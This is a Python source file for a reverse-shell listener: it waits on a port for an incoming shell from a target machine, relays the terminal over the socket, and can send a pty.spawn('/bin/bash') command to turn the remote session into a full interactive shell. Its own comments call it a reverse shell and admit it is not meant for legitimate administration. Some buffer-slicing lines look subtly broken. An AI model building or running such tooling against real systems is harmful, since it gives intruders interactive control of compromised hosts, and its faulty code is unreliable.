#!/usr/bin/python3

import argparse

import socket
import sys
import os
import select

import tty
import termios

buffsize = 65535

# these are the old terminal settings.
oldSettings = None

# flag settings
smartFlag = False


def getConnection(port):
    """
    getConnection uses port to get a single socket from the serversocket, and
    then closes it. the port provided should be valid - returns a socket.
    """
    serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if not serverSocket:
        return None

    serverSocket.bind(('', port))
    serverSocket.listen()

    targetSocket, addr = serverSocket.accept()
    if not targetSocket:
        return None
    
    serverSocket.close()
    print("Recieved contact from ", addr)

    return targetSocket



def usage(progName):
    """
    print the usage for the program. must be given argv[0] as an argument.
    """
    print("usage:\n\t" + progName + " PORT")
    exit()



def restoreTerm():
    """
    restoreTerm

    this function returns the terminal to the old terminal settings.
    it uses the global oldSettings variable.
    """
    global oldSettings
    print('RESTORING TERM')
    termios.tcsetattr(sys.stdin.fileno(), termios.TCSADRAIN, oldSettings)



def tryUpgradeTerm(socketfd):
    """
    tryUpgradeTerm

    this function tries to force a python instance to spawn a shell - this is 
    the first step in creating a "smart" terminal over a dumb connection. This
    method was suggested and developed by Phineas Fisher.

    after a bash instance is spawned, we simply disable tty cooked mode.
    """

    global oldSettings

    remaining = 0;

    pythonSpawnString = b"python -c 'import pty;pty.spawn(\"/bin/bash\")'\n"

    # force python to spawn a shell beforehand.
    # This is used to make "smart" shells.
    while remaining <= len(pythonSpawnString):
        remaining = os.write(socketfd, pythonSpawnString)
        pythonSpawnString = pythonSpawnString[remaining - 1: 0]

    response = os.read(socketfd, buffsize)

    # i.e. we failed to spawn a shell, becase pyton was "not found"
    if b"not found" in response:
        return

    # scary part... disable terminal cooked mode; save old settings.
    oldSettings = termios.tcgetattr(sys.stdin.fileno())
    tty.setraw(sys.stdin)



def readwrite(targetSocket):
    """
    readwrite

    readwrite handles the ins and outs of the different file descriptors.
    The method and order of polling here was taken from the bsd source code
    for their port of the netcat source. This routine is similar, in that it
    uses poll rather than select, except there is (currently) no support for
    tls or any encryption over the connection. Let's be honest, you aren't 
    using this for legitimate administration shells.

    param targetSocket - the socket (full socket) that we need to read/write to
    """

    global smartFlag

    ioPoller = select.poll()

    # register stdin
    ioPoller.register(sys.stdin.fileno(), select.POLLIN)

    # register stdout
    ioPoller.register(sys.stdout.fileno(), select.POLLOUT)

    # register the target stocket fd
    ioPoller.register(targetSocket.fileno(), select.POLLIN | select.POLLOUT 
            | select.POLLPRI | select.POLLHUP | select.POLLERR)

    print("IO channels rerouted.")

    netinbuff = bytes('', 'utf-8')
    stdinbuff = bytes('', 'utf-8')

    socketDone = False
    stdinDone = False

    # we have a valid socket, let's try to write to upgrade it.
    if smartFlag:
        tryUpgradeTerm(targetSocket.fileno())

    while True:

        # we have reached a point where all inputs are closed. CTRL-D/HUP, etc.
        if socketDone and stdinDone:
            if smartFlag and oldSettings:
                restoreTerm()
            return

        pollResults = ioPoller.poll()

        # go through each event in the polling results and handle the IO.
        for fd, evt in pollResults:

            # error conditions
            if evt == select.POLLHUP:
                if fd == targetSocket.fileno():
                    socketDone = True
                    # reading is still possible after HUP
                if fd == sys.stdin.fileno():
                    stdinDone = True

            # handle user io
            if fd == sys.stdin.fileno() and evt & select.POLLIN:
                stdinbuff += os.read(fd, buffsize)
                pollResults.append((targetSocket.fileno(), select.POLLOUT))

                if b'exit\n' in stdinbuff and smartFlag:
                    restoreTerm()
                
            # can write to target socket?
            if fd == targetSocket.fileno() and evt & select.POLLOUT and not socketDone:
                byteswritten = os.write(fd, stdinbuff)
                stdinbuff = stdinbuff[byteswritten - 1: -1]

            # can read target socket?
            if fd == targetSocket.fileno() and evt & select.POLLIN:
                netinbuff += os.read(fd, buffsize)

            # can write to stdout?
            if fd == sys.stdout.fileno() and evt & select.POLLOUT:
                byteswritten = os.write(fd, netinbuff)
                netinbuff = netinbuff[byteswritten - 1: -1]




if __name__ == "__main__":

    port = 4444

    parser = argparse.ArgumentParser(prog=sys.argv[0], description=
        """A reverse shell program written in python. 
            Has a built-in smart-terminal upgrading system"""
    )
    parser.add_argument("-s", "--smart", action='store_true',
            help="Try to upgrade to a smart terminal if possible.")
    parser.add_argument("port", type=int, metavar='port',
            help="The port for the shell to listen to")

    args = parser.parse_args()

    smartFlag = args.smart
    port = args.port

    # try to upgrade to a smart terminal if possible

    print("Listening for incoming shells on port " + str(port) + "...")
    targetSocket = getConnection(int(port))

    print("Target contacted. Initializing shell.")
    readwrite(targetSocket)

